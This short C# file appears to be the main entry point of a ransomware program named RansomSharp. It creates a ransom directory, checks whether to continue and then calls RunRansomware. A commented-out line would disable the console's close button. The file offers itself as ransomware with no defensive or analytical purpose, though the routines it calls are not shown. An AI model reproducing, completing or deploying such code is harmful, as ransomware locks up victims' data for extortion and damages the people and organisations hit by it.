using RansomSharp.Core.Console;
using RansomSharp.Core.Service;

//ConsoleCloserDisabler.DisableCloseButton();

var ransomService = new RansomService();
string ransomDir = ransomService.CreateRansomDirectory();

if (ransomService.ShouldContinueRansomware())
    await ransomService.RunRansomware(ransomDir);